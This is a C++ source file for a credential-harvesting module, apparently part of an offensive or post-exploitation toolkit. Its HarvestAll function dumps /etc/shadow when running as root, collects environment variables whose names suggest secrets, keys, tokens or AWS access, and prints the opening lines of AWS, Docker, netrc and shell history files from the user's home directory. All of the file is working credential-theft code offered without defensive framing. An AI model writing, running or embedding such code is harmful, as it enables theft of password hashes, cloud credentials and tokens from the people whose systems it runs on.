#include "SystemCredentials.h"
#include <fstream>
#include <sstream>
#include <vector>
#include <unistd.h>
#include <filesystem>

extern "C" char **environ;

namespace credential {

namespace fs = std::filesystem;

std::string SystemCredentials::HarvestAll() {
    std::stringstream ss;
    ss << "--- SYSTEM CREDENTIAL HARVEST ---\n\n";

    ss << "[+] Shadow File (Root required):\n";
    ss << DumpShadow() << "\n";

    ss << "[+] Environment Variables:\n";
    ss << GetEnvVars() << "\n";

    ss << "[+] Secret Files:\n";
    ss << SearchSecretFiles() << "\n";

    return ss.str();
}

std::string SystemCredentials::DumpShadow() {
    if (getuid() != 0) {
        return "  [-] Not running as root. Cannot read /etc/shadow.";
    }

    std::ifstream file("/etc/shadow");
    if (!file.is_open()) {
        return "  [-] Failed to open /etc/shadow even as root.";
    }

    std::stringstream ss;
    std::string line;
    while (std::getline(file, line)) {
        ss << "  " << line << "\n";
    }
    return ss.str();
}

std::string SystemCredentials::GetEnvVars() {
    std::stringstream ss;
    for (char **env = environ; *env != 0; env++) {
        std::string entry = *env;
        // Filter for common sensitive names
        if (entry.find("SECRET") != std::string::npos ||
            entry.find("PASSWORD") != std::string::npos ||
            entry.find("KEY") != std::string::npos ||
            entry.find("TOKEN") != std::string::npos ||
            entry.find("AWS") != std::string::npos ||
            entry.find("SSH_AUTH_SOCK") != std::string::npos) {
            ss << "  " << entry << "\n";
        }
    }
    if (ss.str().empty()) return "  [-] No sensitive environment variables found.";
    return ss.str();
}

std::string SystemCredentials::SearchSecretFiles() {
    std::stringstream ss;
    const char* home = getenv("HOME");
    if (!home) return "  [-] HOME not set.";

    std::vector<std::string> targetFiles = {
        "/.aws/credentials",
        "/.aws/config",
        "/.docker/config.json",
        "/.netrc",
        "/.bash_history",
        "/.zsh_history"
    };

    for (const auto& tf : targetFiles) {
        std::string path = std::string(home) + tf;
        if (fs::exists(path)) {
            ss << "  [!] Found: " << path << "\n";
            // Optionally dump a few lines or small files
            std::ifstream file(path);
            if (file.is_open()) {
                std::string line;
                int count = 0;
                while (std::getline(file, line) && count < 10) {
                    ss << "    " << line << "\n";
                    count++;
                }
                if (count == 10) ss << "    ...\n";
            }
        }
    }

    if (ss.str().empty()) return "  [-] No common secret files found.";
    return ss.str();
}

} // namespace credential
